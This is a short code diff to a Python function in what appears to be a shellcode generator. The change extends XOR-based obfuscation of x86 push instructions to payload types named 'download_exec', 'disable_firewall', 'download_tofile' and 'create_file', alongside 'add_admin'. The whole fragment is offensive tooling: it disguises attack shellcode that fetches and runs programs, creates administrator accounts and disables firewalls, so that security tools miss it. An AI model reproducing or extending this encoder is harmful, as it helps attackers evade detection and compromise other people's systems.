@@ -28,8 +28,10 @@ def start(shellcode,job):
 					ebx_2 = ebx_2.replace('-','')
 				    	if job == 'exec':
 					    command = '\npush %%ebx\npush $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nxor %%ebx,%%ecx\npop %%ebx\npush %%ecx\n'%(str(ebx_1),str(ebx_2))
-					elif job == 'add_admin' or job == 'dir_create':
+					elif job == 'add_admin' or job == 'dir_create' or job == 'download_exec':
 					    command = '\npush %%ebx\npush $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nxor %%ebx,%%ecx\npop %%ebx\npush %%ecx\n'%(str(ebx_1),str(ebx_2))
+					elif job == 'create_file' or job == 'disable_firewall' or job == 'download_tofile':
+					    command = '\npush %%eax\npush $0x%s\npop %%eax\npush $0x%s\npop %%ecx\nxor %%eax,%%ecx\npop %%eax\npush %%ecx\n'%(str(ebx_1),str(ebx_2))
 					shellcode = shellcode.replace(line,command)
 					t = False
     return shellcode
